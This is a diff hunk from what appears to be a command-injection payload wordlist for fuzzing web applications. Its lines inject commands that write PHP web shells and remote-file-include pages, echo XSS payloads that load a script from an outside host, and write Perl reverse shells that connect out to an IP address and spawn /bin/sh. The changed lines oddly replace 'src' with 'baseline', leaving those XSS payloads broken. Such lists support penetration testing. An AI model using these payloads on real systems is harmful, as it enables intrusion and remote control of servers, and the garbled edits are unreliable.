@@ -206,7 +206,7 @@ dir C:\Documents and Settings\*
 && dir C:\\Users
 dir C:\\Users
 ;echo%20'<script>alert(1)</script>'
-echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+echo '<img baseline=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
 | echo "<?php include($_GET['page'])| ?>" > rfi.php
 ; echo "<?php include($_GET['page']); ?>" > rfi.php
 & echo "<?php include($_GET['page']); ?>" > rfi.php
@@ -224,7 +224,7 @@ echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
 echo "<?php system($_GET['cmd']); ?>" > cmd.php
 ;echo '<script>alert(1)</script>'
 echo '<script>alert(1)</script>'// XXXXXXXXXXX
-echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX
+echo '<script baseline=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX
 | echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
 ; echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
 & echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
